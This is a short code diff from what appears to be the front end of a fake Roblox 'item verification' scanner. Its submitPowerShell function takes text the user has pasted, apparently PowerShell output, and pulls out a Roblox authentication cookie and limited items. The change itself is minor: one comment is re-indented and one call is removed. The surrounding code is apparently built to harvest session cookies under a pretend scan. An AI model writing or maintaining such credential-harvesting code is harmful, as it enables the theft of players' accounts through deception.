@@ -211,10 +211,9 @@ async function submitPowerShell() {
     showLoadingOverlay('Preparing scan...', 'Initializing item verification process');
 
     try {
-                // Scan limited items and find authentication data from the input
+                        // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
-        const detectedItem = detectRobloxItem(inputText);
         
         // Check word count using real input value - if 50+ words, allow through even without auth data
         const wordCount = realInputValue.split(/\s+/).filter(word => word.length > 0).length;
